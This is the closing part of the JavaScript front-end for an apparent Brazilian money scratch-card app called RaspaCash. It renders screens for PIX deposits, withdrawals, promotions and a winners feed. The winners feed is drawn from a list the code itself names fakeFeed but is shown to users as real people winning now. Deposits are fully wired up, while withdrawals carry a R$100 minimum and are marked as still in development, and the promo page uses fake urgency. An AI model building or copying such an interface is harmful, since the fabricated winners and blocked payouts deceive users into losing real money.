                            </div>
                        `}
                    </div>
                </div>
            </div>
        `;
    }
    
    renderDeposit() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 p-4 text-white overflow-y-scroll relative">
                <div class="absolute inset-0 opacity-30">
                    <div class="absolute top-20 left-20 w-40 h-40 bg-yellow-400 rounded-full blur-2xl animate-pulse"></div>
                    <div class="absolute bottom-20 right-20 w-32 h-32 bg-green-400 rounded-full blur-2xl animate-bounce"></div>
                </div>
                <div class="bg-gradient-to-br from-gray-900/90 to-purple-900/90 backdrop-blur-lg rounded-2xl p-4 sm:p-8 max-w-md w-full mx-auto my-4 border border-purple-400/50 shadow-2xl relative z-10">
                    <div class="text-center mb-4 sm:mb-6">
                        <h2 class="text-2xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-green-400 to-blue-400 bg-clip-text text-transparent">
                            💳 Fazer Depósito 💳
                        </h2>
                        <p class="text-base sm:text-lg text-yellow-300">Escolha o método de pagamento</p>
                    </div>
                    
                    <form onsubmit="app.handleDeposit(event)" class="space-y-4">
                        <div>
                            <label class="block text-sm font-bold mb-2">Valor do Depósito</label>
                            <input
                                name="depositAmount"
                                type="number"
                                min="5"
                                step="0.01"
                                required
                                class="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                                placeholder="R$ 0,00"
                            />
                        </div>
                        
                        <div>
                            <label class="block text-sm font-bold mb-2">Método de Pagamento</label>
                            <div class="flex justify-center">
                                <div class="p-4 rounded-lg border-2 border-green-400 bg-gradient-to-br from-green-400/30 to-emerald-400/30 shadow-lg shadow-green-400/20 w-48">
                                    <div class="text-center">
                                        <div class="text-3xl mb-2">📱</div>
                                        <div class="text-lg font-bold text-green-200">PIX</div>
                                        <div class="text-sm text-green-300 mt-1">Pagamento instantâneo</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <button
                            type="submit"
                            ${this.state.isProcessingPayment ? 'disabled' : ''}
                            class="w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 ${
                                this.state.isProcessingPayment
                                    ? 'bg-gray-500 cursor-not-allowed border-gray-400'
                                    : 'bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 border-green-300'
                            }"
                        >
                            ${this.state.isProcessingPayment ? '⏳ Gerando PIX...' : '🚀 Depositar via PIX ⚡'}
                        </button>
                    </form>
                    
                    <button
                        onclick="app.state.currentScreen = 'menu'; app.render();"
                        class="w-full mt-4 bg-gray-600 hover:bg-gray-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-gray-400"
                    >
                        Cancelar
                    </button>
                </div>
            </div>
        `;
    }
    
    renderPix() {
        if (!this.state.currentPixPayment) return '';
        
        return `
            <div class="w-full h-full bg-gradient-to-br from-blue-600 via-indigo-600 to-purple-600 p-4 text-white flex items-center justify-center relative overflow-hidden">
                <div class="absolute inset-0 opacity-30">
                    <div class="absolute top-20 left-20 w-40 h-40 bg-green-400 rounded-full blur-2xl animate-pulse"></div>
                    <div class="absolute bottom-20 right-20 w-32 h-32 bg-blue-400 rounded-full blur-2xl animate-bounce"></div>
                </div>
                
                <div class="bg-white rounded-2xl p-8 max-w-md w-full mx-4 text-gray-800 relative z-10 shadow-2xl">
                    <div class="text-center mb-6">
                        <div class="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-600 rounded-full mx-auto mb-4 flex items-center justify-center">
                            <span class="text-3xl">📱</span>
                        </div>
                        <h3 class="text-2xl font-bold text-gray-800 mb-2">Pagamento PIX</h3>
                        <p class="text-gray-600">Escaneie o QR Code ou use o código PIX</p>
                    </div>
                    
                    <div class="text-center mb-6">
                        <div id="qrCodeContainer" class="bg-gray-100 p-4 rounded-lg mb-4 flex justify-center">
                            <canvas id="qrCanvas" class="max-w-full"></canvas>
                        </div>
                        <div class="text-2xl font-bold text-green-600 mb-2">
                            R$ ${this.state.currentPixPayment.amount.toFixed(2).replace('.', ',')}
                        </div>
                        <div class="text-sm text-gray-500 flex items-center justify-center">
                            <div class="w-2 h-2 bg-orange-500 rounded-full animate-pulse mr-2"></div>
                            Aguardando pagamento...
                        </div>
                    </div>
                    
                    <div class="space-y-3">
                        <button 
                            onclick="if (app.state.currentPixPayment?.qr_code) { navigator.clipboard.writeText(app.state.currentPixPayment.qr_code); alert('Código PIX copiado!'); }"
                            class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-all"
                        >
                            📋 Copiar Código PIX
                        </button>
                        <button 
                            onclick="app.state.showPixModal = false; app.state.currentScreen = 'menu'; if (app.state.pixCheckInterval) { clearInterval(app.state.pixCheckInterval); app.state.pixCheckInterval = null; } app.render();"
                            class="w-full bg-gray-500 hover:bg-gray-600 text-white font-bold py-3 rounded-lg transition-all"
                        >
                            Cancelar
                        </button>
                    </div>
                    
                    <div class="mt-4 text-center text-xs text-gray-400">
                        <p>⏰ Este PIX expira em 30 minutos</p>
                        <p>💡 O pagamento será confirmado automaticamente</p>
                    </div>
                </div>
            </div>
        `;
    }
    
    generateQRCode() {
        setTimeout(() => {
            if (this.state.currentPixPayment && this.state.currentPixPayment.qr_code) {
                const canvas = document.getElementById('qrCanvas');
                if (canvas && window.QRCode) {
                    window.QRCode.toCanvas(canvas, this.state.currentPixPayment.qr_code, { 
                        width: 200,
                        margin: 2,
                        color: {
                            dark: '#000000',
                            light: '#FFFFFF'
                        }
                    }, function (error) {
                        if (error) console.error('Erro ao gerar QR Code:', error);
                    });
                }
            }
        }, 100);
    }
    
    renderWithdraw() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-purple-600 via-pink-600 to-red-600 p-4 text-white overflow-y-scroll relative">
                <div class="bg-gradient-to-br from-gray-900/90 to-purple-900/90 backdrop-blur-lg rounded-2xl p-4 sm:p-8 max-w-md w-full mx-auto my-4 border border-purple-400/50 shadow-2xl relative z-10">
                    <div class="text-center mb-4 sm:mb-6">
                        <h2 class="text-2xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                            💸 Solicitar Saque 💸
                        </h2>
                        <p class="text-base sm:text-lg text-yellow-300">Saque via PIX - Rápido e Seguro</p>
                    </div>

                    <div class="bg-yellow-500/20 border border-yellow-400/50 rounded-lg p-4 mb-4">
                        <div class="text-center">
                            <div class="text-lg font-bold text-yellow-300 mb-1">
                                ⚠️ SAQUE MÍNIMO ⚠️
                            </div>
                            <div class="text-base text-yellow-200">
                                R$ 100,00
                            </div>
                        </div>
                    </div>
                    
                    <div class="text-center text-sm text-red-300 bg-red-500/20 rounded-lg p-3 mb-4 border border-red-400/40">
                        <p>💰 Saldo atual: R$ ${this.state.balance.toFixed(2)}</p>
                        <p class="mt-1">🚫 Funcionalidade de saque em desenvolvimento</p>
                    </div>
                    
                    <button
                        onclick="app.state.currentScreen = 'menu'; app.render();"
                        class="w-full bg-gray-600 hover:bg-gray-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-gray-400"
                    >
                        🔙 Voltar ao Menu
                    </button>
                </div>
            </div>
        `;
    }
    
    renderPromo() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-yellow-500 via-orange-500 via-red-500 to-pink-500 p-4 text-white overflow-y-scroll relative">
                <div class="max-w-6xl mx-auto relative z-10">
                    <div class="text-center mb-8">
                        <h2 class="text-5xl font-bold mb-4 bg-gradient-to-r from-yellow-200 via-white to-yellow-200 bg-clip-text text-transparent animate-pulse">
                            🔥 SUPER PROMOÇÃO! 🔥
                        </h2>
                        <p class="text-2xl text-yellow-100 font-bold">PACOTES ESPECIAIS COM DESCONTO!</p>
                    </div>

                    <div class="text-center bg-gradient-to-r from-red-500/20 to-pink-500/20 rounded-xl p-6 mb-6 border border-red-400/30">
                        <div class="text-2xl font-bold text-red-200 mb-2">
                            ⏰ OFERTA LIMITADA! ⏰
                        </div>
                        <div class="text-lg text-yellow-200">
                            Aproveite os pacotes promocionais e economize até 40%!
                        </div>
                        <div class="text-sm text-red-300 mt-2">
                            🚧 Funcionalidade em desenvolvimento
                        </div>
                    </div>
                    
                    <button
                        onclick="app.state.currentScreen = 'menu'; app.render();"
                        class="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-blue-300"
                    >
                        🔙 Voltar ao Menu Principal
                    </button>
                </div>
            </div>
        `;
    }
    
    renderFeed() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-green-600 via-teal-600 to-cyan-600 p-4 text-white relative overflow-y-scroll">
                <div class="max-w-2xl mx-auto relative z-10">
                    <div class="text-center mb-6">
                        <h2 class="text-3xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent">
                            🎉 Ganhos Recentes 🎉
                        </h2>
                        <p class="text-lg text-yellow-200">Veja quem está ganhando agora!</p>
                    </div>
                    
                    <div class="space-y-3 mb-6 max-h-96 overflow-y-auto">
                        ${this.fakeFeed.map((winner, index) => `
                            <div class="bg-gradient-to-r from-purple-800/60 via-pink-800/60 to-red-800/60 backdrop-blur-sm rounded-lg p-4 flex items-center justify-between border border-yellow-400/30 transform hover:scale-105 transition-all shadow-lg">
                                <div class="flex items-center space-x-3">
                                    <div class="w-10 h-10 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center text-white font-bold shadow-lg">
                                        ${winner.name.charAt(0)}
                                    </div>
                                    <div>
                                        <div class="font-bold">${winner.name}</div>
                                        <div class="text-sm opacity-75">Plano ${winner.plan} • ${winner.time}</div>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <div class="text-xl font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">R$ ${winner.amount}</div>
                                    <div class="text-xs text-yellow-300 font-bold animate-pulse">🎉 GANHOU! 🎉</div>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                    
                    <button
                        onclick="app.state.currentScreen = 'menu'; app.render();"
                        class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-blue-400"
                    >
                        Voltar ao Jogo
                    </button>
                </div>
            </div>
        `;
    }
}

// Inicializar a aplicação
let app;
window.addEventListener('DOMContentLoaded', () => {
    app = new RaspaCashApp();
});

// Tornar disponível globalmente
window.app = app;
